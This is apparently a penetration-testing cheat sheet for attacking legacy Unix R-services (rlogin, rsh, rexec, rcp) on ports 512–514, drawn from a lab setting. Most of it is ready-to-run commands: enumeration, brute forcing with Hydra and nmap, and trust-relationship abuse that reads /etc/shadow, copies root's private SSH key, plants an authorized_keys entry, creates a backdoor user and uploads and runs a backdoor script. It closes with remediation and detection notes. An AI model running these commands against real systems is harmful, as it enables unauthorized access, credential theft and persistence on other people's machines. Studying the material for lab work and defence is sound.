# R-Services (Ports 512, 513, 514)

Exploit legacy R-services (rlogin, rsh, rexec) to gain unauthorized remote access through trust relationships.
R-services are outdated remote access protocols that rely on IP-based trust, commonly found on legacy Unix systems.

## R-Services Overview

| Command | Service Daemon | Port | Protocol | Description |
|---------|---------------|------|----------|-------------|
| `rcp` | rshd | 514 | TCP | Remote copy - copies files between systems |
| `rsh` | rshd | 514 | TCP | Remote shell - executes commands without login |
| `rexec` | rexecd | 512 | TCP | Remote execution - requires username/password |
| `rlogin` | rlogind | 513 | TCP | Remote login - similar to telnet for Unix hosts |

## Enumeration

### Nmap
```bash
# Scan R-service ports
sudo nmap -sV -p 512,513,514 10.10.10.10

# R-service scripts
sudo nmap -p 512,513,514 --script rexec-brute,rlogin-brute 10.10.10.10
```

## Trust Relationships

### /etc/hosts.equiv
```bash
# View trusted hosts (if accessible)
cat /etc/hosts.equiv

# Example entries:
htb-student     10.10.10.5
+               10.10.10.10
+               +
```

### ~/.rhosts
```bash
# User-specific trust file
cat ~/.rhosts

# Example entries:
htb-student     10.10.10.5
+               10.10.10.10
+               +
```

### Trust Entry Meanings
- `+` in hostname field = any host
- `+` in username field = any user
- `+ +` = any user from any host (extremely dangerous!)

## rlogin (Port 513)

### Basic Usage
```bash
# Login as current user
rlogin 10.10.10.10

# Login as specific user
rlogin 10.10.10.10 -l username

# If trusted, no password required
rlogin 10.10.10.10 -l htb-student
```

### Exploitation
```bash
# If .rhosts allows your IP
rlogin 10.10.10.10 -l root

# Try common usernames
for user in root admin oracle postgres; do
    rlogin 10.10.10.10 -l $user
done
```

## rsh (Port 514)

### Execute Commands
```bash
# Execute single command
rsh 10.10.10.10 whoami

# Execute as specific user
rsh -l username 10.10.10.10 whoami

# Execute multiple commands
rsh 10.10.10.10 "uname -a; id; pwd"
```

### Exploitation
```bash
# If trusted, execute commands as root
rsh -l root 10.10.10.10 "cat /etc/shadow"

# Add SSH key
rsh -l root 10.10.10.10 "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"

# Create backdoor user
rsh -l root 10.10.10.10 "useradd -m -s /bin/bash backdoor && echo 'backdoor:password' | chpasswd"
```

## rexec (Port 512)

### Execute with Credentials
```bash
# Requires username and password
rexec 10.10.10.10 -l username -p password whoami

# Execute command
rexec 10.10.10.10 -l admin -p admin123 "cat /etc/passwd"
```

## rcp (Port 514)

### Copy Files
```bash
# Copy local file to remote
rcp localfile.txt 10.10.10.10:/tmp/

# Copy remote file to local
rcp 10.10.10.10:/etc/passwd ./passwd.txt

# Copy between remote hosts
rcp host1:/file.txt host2:/file.txt

# Copy directory recursively
rcp -r /local/dir 10.10.10.10:/remote/dir
```

### Exploitation
```bash
# If trusted, copy sensitive files
rcp 10.10.10.10:/etc/shadow ./shadow.txt
rcp 10.10.10.10:/root/.ssh/id_rsa ./root_key

# Upload backdoor
rcp backdoor.sh 10.10.10.10:/tmp/
rsh 10.10.10.10 "chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
```

## rwho / rusers

### List Logged-in Users
```bash
# Show who is logged in (rwho)
rwho

# Output:
# root     web01:pts/0 Dec  2 21:34
# htb-student     workstn01:tty1  Dec  2 19:57  2:25

# List users on specific host (rusers)
rusers -al 10.10.10.10
```

## Brute Force

### Hydra
```bash
# rlogin brute force
hydra -L users.txt -P passwords.txt rlogin://10.10.10.10

# rsh brute force
hydra -L users.txt -P passwords.txt rsh://10.10.10.10

# rexec brute force
hydra -L users.txt -P passwords.txt rexec://10.10.10.10
```

### Nmap
```bash
# rlogin brute force
nmap -p 513 --script rlogin-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10

# rexec brute force
nmap -p 512 --script rexec-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
```

## Common Workflow

### Full R-Services Assessment
```bash
# 1. Discover R-services
sudo nmap -sV -p 512,513,514 10.10.10.10

# 2. Check for trust relationships (if you have access)
cat /etc/hosts.equiv
cat ~/.rhosts

# 3. Try rlogin without password
rlogin 10.10.10.10 -l root
rlogin 10.10.10.10 -l admin

# 4. Try rsh command execution
rsh 10.10.10.10 whoami
rsh -l root 10.10.10.10 id

# 5. List logged-in users
rwho
rusers -al 10.10.10.10

# 6. If trusted, escalate
rsh -l root 10.10.10.10 "cat /etc/shadow"
rcp 10.10.10.10:/root/.ssh/id_rsa ./root_key

# 7. Establish persistence
rsh -l root 10.10.10.10 "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
```

## Notes

**Security Issues:**
- Authentication based on IP address (easily spoofed)
- No encryption (cleartext transmission)
- Trust relationships bypass authentication
- Deprecated and insecure by design
- Should be replaced with SSH

**Trust Relationship Exploitation:**
- `+` wildcard allows any host/user
- Misconfigured .rhosts files common
- Can execute commands as trusted user
- No password required if trusted
- Complete system compromise possible

**Common Misconfigurations:**
- `+ +` in hosts.equiv (trust everyone)
- World-readable .rhosts files
- Overly permissive trust entries
- R-services still enabled on modern systems
- No firewall restrictions

**Attack Vectors:**
- IP spoofing to match trusted hosts
- Exploiting trust relationships
- Brute forcing credentials (rexec)
- Copying sensitive files (rcp)
- Command execution (rsh)
- Unauthorized login (rlogin)

**Why Still Relevant:**
- Legacy Unix systems still in production
- Industrial control systems
- Embedded devices
- Old network equipment
- Backup/disaster recovery systems

**Remediation:**
- Disable R-services completely
- Replace with SSH
- Remove hosts.equiv and .rhosts files
- Use firewall to block ports 512-514
- Audit trust relationships
- Monitor for R-service usage

**Comparison to SSH:**
- R-services: No encryption, IP-based trust, deprecated
- SSH: Encrypted, key-based auth, actively maintained
- SSH should always be used instead of R-services

**Detection:**
- R-service traffic is cleartext
- Easy to detect with network monitoring
- Look for connections to ports 512-514
- Check for hosts.equiv and .rhosts files
